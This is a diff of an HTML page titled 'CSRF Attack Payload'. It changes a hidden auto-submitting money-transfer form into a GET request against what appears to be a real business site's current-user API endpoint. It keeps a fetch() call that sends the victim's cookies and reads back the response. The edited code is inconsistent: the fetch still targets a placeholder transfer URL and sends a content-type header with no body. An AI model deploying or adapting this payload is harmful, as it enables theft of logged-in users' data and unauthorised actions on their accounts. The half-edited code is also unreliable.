@@ -10,24 +10,17 @@
     <h1>CSRF Attack Payload</h1>
     
     <!-- This form automatically submits the CSRF request when the page is loaded -->
-    <form id="csrfForm" action="https://vulnerable-app.com/transfer" method="POST" style="display:none;">
-        <input type="hidden" name="amount" value="1000">
-        <input type="hidden" name="to_account" value="victim_account">
-        <input type="submit" value="Submit">
+    <form id="csrfForm" action="https://b2b.shlomo.co.il/common_api/user/getCurrent" method="GET" style="display:none;">
     </form>
     
     <script>
-        // Automatically submit the form to trigger the CSRF attack
-        document.getElementById('csrfForm').submit();
-
         // Fetch API to send a POST request and store the response
         fetch('https://vulnerable-app.com/transfer', {
-            method: 'POST',
+            method: 'GET',
             credentials: 'include', // Ensures cookies are sent with the request
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: 'amount=1000&to_account=victim_account'
+            }
         })
         .then(response => response.text()) // Extract the response text
         .then(data => {
